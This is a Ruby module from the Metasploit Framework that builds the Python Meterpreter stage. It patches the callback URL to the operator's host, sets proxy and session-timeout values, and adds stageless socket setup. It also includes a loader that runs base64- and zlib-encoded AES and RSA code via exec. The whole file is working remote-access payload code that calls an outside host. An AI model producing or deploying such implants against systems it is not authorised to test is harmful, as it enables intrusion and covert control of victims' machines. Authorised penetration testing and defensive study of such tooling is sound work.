# -*- coding: binary -*-


module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader

  include Msf::Payload::Python
  include Msf::Payload::UUID::Options
  include Msf::Payload::TransportConfig
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options(
      [
        OptBool.new(
          'MeterpreterTryToFork',
          'Fork a new process if the functionality is available',
          default: true
        ),
        OptBool.new(
          'MeterpreterDebugBuild',
          'Enable debugging for the Python meterpreter',
          aliases: ['PythonMeterpreterDebug']
        )
      ] +
      Msf::Opt::http_header_options
    )
  end

  def stage_payload(opts={})
    Rex::Text.encode_base64(Rex::Text.zlib_deflate(stage_meterpreter(opts)))
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  #
  # @param opts [Hash] The options to use for patching the stage data.
  # @option opts [String] :http_proxy_host The host to use as a proxy for
  #   HTTP(S) transports.
  # @option opts [String] :http_proxy_port The port to use when a proxy  host is
  #   set for HTTP(S) transports.
  # @option opts [String] :url The HTTP(S) URL to patch in to
  #   allow use of the stage as a stageless payload.
  # @option opts [String] :http_user_agent The value to use for the User-Agent
  #   header for HTTP(S) transports.
  # @option opts [String] :stageless_tcp_socket_setup Python code to execute to
  #   setup a tcp socket to allow use of the stage as a stageless payload.
  # @option opts [String] :uuid A specific UUID to use for sessions created by
  #   this stage.
  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\' * 8).gsub('\'', %q(\\\\\\\'))
    }

    if ds['MeterpreterDebugBuild']
      met.sub!(%q|DEBUGGING = False|, %q|DEBUGGING = True|)

      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(ds['MeterpreterDebugLogging'])
      met.sub!(%q|DEBUGGING_LOG_FILE_PATH = None|, %Q|DEBUGGING_LOG_FILE_PATH = "#{logging_options[:rpath]}"|) if logging_options[:rpath]
    end

    unless ds['MeterpreterTryToFork']
      met.sub!('TRY_TO_FORK = True', 'TRY_TO_FORK = False')
    end

    met.sub!("# PATCH-SETUP-ENCRYPTION #", python_encryptor_loader)

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{ds['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{ds['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{ds['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{ds['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid(arch: ARCH_PYTHON, platform: 'python')
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

    if opts[:stageless] == true
      session_guid = '00' * 16
    else
      session_guid = SecureRandom.uuid.gsub(/-/, '')
    end
    met.sub!("SESSION_GUID = \'\'", "SESSION_GUID = \'#{session_guid}\'")

    http_user_agent = opts[:http_user_agent] || ds['HttpUserAgent']
    http_proxy_host = opts[:http_proxy_host] || ds['HttpProxyHost'] || ds['PROXYHOST']
    http_proxy_port = opts[:http_proxy_port] || ds['HttpProxyPort'] || ds['PROXYPORT']
    http_proxy_user = opts[:http_proxy_user] || ds['HttpProxyUser']
    http_proxy_pass = opts[:http_proxy_pass] || ds['HttpProxyPass']
    http_header_host = opts[:header_host] || ds['HttpHostHeader']
    http_header_cookie = opts[:header_cookie] || ds['HttpCookie']
    http_header_referer = opts[:header_referer] || ds['HttpReferer']

    # The callback URL can be different to the one that we're receiving from the interface
    # so we need to generate it
    # TODO: move this to somewhere more common so that it can be used across payload types
    unless opts[:url].to_s == ''

      # Build the callback URL (TODO: share this logic with TransportConfig
      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
      scheme, lhost, lport = transport_uri_components(opts)
      callback_url = "#{scheme}://#{lhost}:#{lport}#{luri}#{uri}/"

      # patch in the various payload related configuration
      met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
      met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(http_user_agent)}'") if http_user_agent.to_s != ''
      met.sub!('HTTP_COOKIE = None', "HTTP_COOKIE = '#{var_escape.call(http_header_cookie)}'") if http_header_cookie.to_s != ''
      met.sub!('HTTP_HOST = None', "HTTP_HOST = '#{var_escape.call(http_header_host)}'") if http_header_host.to_s != ''
      met.sub!('HTTP_REFERER = None', "HTTP_REFERER = '#{var_escape.call(http_header_referer)}'") if http_header_referer.to_s != ''

      if http_proxy_host.to_s != ''
        http_proxy_url = "http://"
        unless http_proxy_user.to_s == '' && http_proxy_pass.to_s == ''
          http_proxy_url << "#{Rex::Text.uri_encode(http_proxy_user)}:#{Rex::Text.uri_encode(http_proxy_pass)}@"
        end
        http_proxy_url << (Rex::Socket.is_ipv6?(http_proxy_host) ? "[#{http_proxy_host}]" : http_proxy_host)
        http_proxy_url << ":#{http_proxy_port}"

        met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(http_proxy_url)}'")
      end
    end

    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      offset_string = ""
      /(?<offset_string>\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #/ =~ met
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "#{offset_string}#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("#{offset_string}# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

  def python_encryptor_loader
    aes_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_aes_source))
    rsa_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_rsa_source))
    %Q?
import codecs,base64,zlib
try:
  import importlib.util
  new_module = lambda x: importlib.util.spec_from_loader(x, loader=None)
except ImportError:
  import imp
  new_module = imp.new_module
met_aes = new_module('met_aes')
met_rsa = new_module('met_rsa')
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'met_aes','exec'), met_aes.__dict__)
exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'met_rsa','exec'), met_rsa.__dict__)
sys.modules['met_aes'] = met_aes
sys.modules['met_rsa'] = met_rsa
import met_rsa, met_aes
def met_rsa_encrypt(der, msg):
    return met_rsa.rsa_enc(der, msg)
def met_aes_encrypt(key, iv, pt):
    return met_aes.AESCBC(key).encrypt(iv, pt)
def met_aes_decrypt(key, iv, pt):
    return met_aes.AESCBC(key).decrypt(iv, pt)
    ?
  end

  def python_rsa_source
    %Q?
import sys,math,random,binascii as ba,os
from struct import unpack as u
from struct import pack
is2 = sys.version_info[0]<3
def bt(b):
	if is2:
		return b
	return ord(b)
def b2i(b):
	return int(ba.b2a_hex(b),16)
def i2b(i):
	h='%x'%i
	if len(h)%2==1:
		h ='0'+h
	if not is2:
		h=h.encode('utf-8')
	return ba.a2b_hex(h)
def rs(a,o):
	if a[o]==bt(pack('B',0x81)):
		return(u('B',a[o+1])[0],2+o)
	elif a[o] == bt(pack('B',0x82)):
		return(u('>H',a[o+1:o+3])[0],3+o)
def ri(b,o):
	i,o =rs(b,o)
	return(b[o:o+i],o+i)
def b2me(b):
	if b[0]!=bt(pack('B',0x30)):
		return(None,None)
	_,o=rs(b,1)
	if b[o]!=bt(pack('B',2)):
		return(None,None)
	(m,o)=ri(b,o+1)
	if b[o]!=bt(pack('B',2)):
		return(None,None)
	e=b[o+2:]
	return(b2i(m),b2i(e))
def der2me(d):
	if d[0]!=bt(pack('B',0x30)):
		return(None,None)
	_,o=rs(d,1)
	while o<len(d):
		if d[o]==bt(pack('B',0x30)):
			o+=u('B',d[o+1:o+2])[0]
		elif d[o]==bt(pack('B',0x05)):
			o+=2
		elif d[o]==bt(pack('B',0x03)):
			_,o=rs(d,o+1)
			return b2me(d[o+1:])
		else:
			return(None,None)
def rsa_enc(der,msg):
	m,e=der2me(der)
	h=pack('BB',0,2)
	d=pack('B',0)
	l=256-len(h)-len(msg)-len(d)
	p=os.urandom(512).replace(pack('B',0),pack(''))
	return i2b(pow(b2i(h+p[:l]+d+msg),e,m))
?
  end

  def python_aes_source
    %Q?
import copy,struct,sys
def chunks(lst, n):
	for i in range(0,len(lst),n):
		yield lst[i:i+n]
def _cw(word):
	return(word[0]<<24)|(word[1]<<16)|(word[2]<<8)|word[3]
def _s2b(text):
	return list(ord(c)for c in text)
def _b2s(binary):
	return "".join(chr(b)for b in binary)
if sys.version_info[0]>=3:
	xrange=range
	def _s2b(text):
		if isinstance(text,bytes):
			return text
		return[ord(c)for c in text]
	def _b2s(binary):
		return bytes(binary)
else:
	bytes=lambda s,e:s
def _gmul(a, b):
	r=0
	while b:
		if b&1: r^=a
		a<<=1
		if a>255: a^=0x11B
		b>>=1
	return r
def _mix(n, vec):
	return sum(_gmul(n,v)<<(24-8*shift) for shift,v in enumerate(vec))
def _ror32(n):
	return (n&255)<<24|n>>8
def _rcon():
	return [_gmul(1, 1<<n) for n in range(30)]
def _Si(S):
	return [S.index(n) for n in range(len(S))]
def _mixl(S, vec):
	return [_mix(s, vec) for s in S]
def _rorl(T):
	return [_ror32(t) for t in T]
empty=struct.pack('')
class AESCBC(object):
	nrs={16:10,24:12,32:14}
	rcon=_rcon()
	S=[99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22]
	Si=_Si(S)
	T1=_mixl(S, (2,1,1,3))
	T2=_rorl(T1)
	T3=_rorl(T2)
	T4=_rorl(T3)
	T5=_mixl(Si, (14,9,13,11))
	T6=_rorl(T5)
	T7=_rorl(T6)
	T8=_rorl(T7)
	U1=_mixl(range(256), (14,9,13,11))
	U2=_rorl(U1)
	U3=_rorl(U2)
	U4=_rorl(U3)
	def __init__(self,key):
		if len(key)not in(16,24,32):
			raise ValueError('Invalid key size')
		rds=self.nrs[len(key)];self._Ke=[[0]*4 for i in xrange(rds+1)];self._Kd=[[0]*4 for i in xrange(rds+1)];rnd_kc=(rds+1)*4;KC=len(key)//4;tk=[struct.unpack('>i',key[i:i+4])[0]for i in xrange(0,len(key),4)];rconpointer=0;t=KC
		for i in xrange(0,KC):
			self._Ke[i//4][i%4]=tk[i];self._Kd[rds-(i//4)][i%4]=tk[i]
		while t < rnd_kc:
			tt=tk[KC-1];tk[0]^=((self.S[(tt>>16)&255]<<24)^(self.S[(tt>>8)&255]<<16)^(self.S[tt&255]<<8)^self.S[(tt>>24)&255]^(self.rcon[rconpointer]<<24));rconpointer+=1
			if KC!=8:
				for i in xrange(1,KC):
					tk[i]^=tk[i-1]
			else:
				for i in xrange(1,KC//2):
					tk[i]^=tk[i-1]
				tt=tk[KC//2-1];tk[KC//2]^=(self.S[tt&255]^(self.S[(tt>>8)&255]<<8)^(self.S[(tt>>16)&255]<<16)^(self.S[(tt>>24)&255]<<24))
				for i in xrange(KC//2+1,KC):
					tk[i]^=tk[i-1]
			j=0
			while j<KC and t<rnd_kc:
				self._Ke[t//4][t%4]=tk[j];self._Kd[rds-(t//4)][t%4]=tk[j];j+=1;t+=1
		for r in xrange(1,rds):
			for j in xrange(0,4):
				tt=self._Kd[r][j];self._Kd[r][j]=(self.U1[(tt>>24)&255]^self.U2[(tt>>16)&255]^self.U3[(tt>>8)&255]^self.U4[tt&255])
	def _encdec(self,data,K,s,S,L1,L2,L3,L4):
		if len(data)!=16:
			raise ValueError('wrong block length')
		rds=len(K)-1;(s1,s2,s3)=s;a=[0,0,0,0];t=[(_cw(data[4*i:4*i+4])^K[0][i])for i in xrange(0,4)]
		for r in xrange(1,rds):
			for i in xrange(0,4):
				a[i]=(L1[(t[i]>>24)&255]^L2[(t[(i+s1)%4]>>16)&255]^L3[(t[(i+s2)%4]>>8)&255]^L4[t[(i+s3)%4]&255]^K[r][i])
			t=copy.copy(a)
		rst=[]
		for i in xrange(0,4):
			tt=K[rds][i];rst.append((S[(t[i]>>24)&255]^(tt>>24))&255);rst.append((S[(t[(i+s1)%4]>>16)&255]^(tt>>16))&255);rst.append((S[(t[(i+s2)%4]>>8)&255]^(tt>>8))&255);rst.append((S[t[(i+s3)%4]&255]^tt)&255)
		return rst
	def enc_in(self,pt):
		return self._encdec(pt,self._Ke,[1,2,3],self.S,self.T1,self.T2,self.T3,self.T4)
	def dec_in(self,ct):
		return self._encdec(ct,self._Kd,[3,2,1],self.Si,self.T5,self.T6,self.T7,self.T8)
	def pad(self,pt):
		c=16-(len(pt)%16)
		return pt+bytes(chr(c)*c,'utf-8')
	def unpad(self,pt):
		c=pt[-1]
		if type(c)!=int:
			c=ord(c)
		return pt[:-c]
	def encrypt(self,iv,pt):
		if len(iv)!=16:
			raise ValueError('initialization vector must be 16 bytes')
		else:
			self._lcb=_s2b(iv)
		pt=self.pad(pt)
		return empty.join([self.enc_b(b)for b in chunks(pt,16)])
	def enc_b(self,pt):
		if len(pt)!=16:
			raise ValueError('plaintext block must be 16 bytes')
		pt=_s2b(pt);pcb=[(p^l)for(p,l)in zip(pt,self._lcb)];self._lcb=self.enc_in(pcb)
		return _b2s(self._lcb)
	def decrypt(self,iv,ct):
		if len(iv)!=16:
			raise ValueError('initialization vector must be 16 bytes')
		else:
			self._lcb=_s2b(iv)
		if len(ct)%16!=0:
			raise ValueError('ciphertext must be a multiple of 16')
		return self.unpad(empty.join([self.dec_b(b)for b in chunks(ct,16)]))
	def dec_b(self,ct):
		if len(ct)!=16:
			raise ValueError('ciphertext block must be 16 bytes')
		cb=_s2b(ct);pt=[(p^l)for(p,l)in zip(self.dec_in(cb),self._lcb)];self._lcb=cb
		return _b2s(pt)
?
  end
end

end
